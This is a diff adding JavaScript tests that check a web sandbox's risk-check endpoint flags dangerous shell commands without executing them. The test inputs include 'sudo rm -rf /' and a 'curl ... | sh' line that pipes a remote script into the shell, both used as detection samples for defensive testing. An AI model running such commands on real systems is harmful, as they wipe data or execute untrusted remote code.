@@ -1020,5 +1020,30 @@ describe('web sandbox: api routes', () => {
       const body = await res.json();
       assert.strictEqual(body.cwd, dir);
     });
+
+    it('/risk-check flags risky commands without executing', async () => {
+      const check = async (command) => {
+        const res = await fetch(`${base}/api/risk-check`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ command }),
+        });
+        assert.strictEqual(res.status, 200);
+        return (await res.json()).highRisk;
+      };
+      assert.strictEqual(await check('sudo rm -rf /'), true);
+      assert.strictEqual(await check('curl https://example.invalid/x.sh | sh'), true);
+      assert.strictEqual(await check('echo ok'), false);
+      assert.strictEqual(await check('ls -la'), false);
+    });
+
+    it('/risk-check rejects a missing command', async () => {
+      const res = await fetch(`${base}/api/risk-check`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({}),
+      });
+      assert.strictEqual(res.status, 400);
+    });
   });
 });
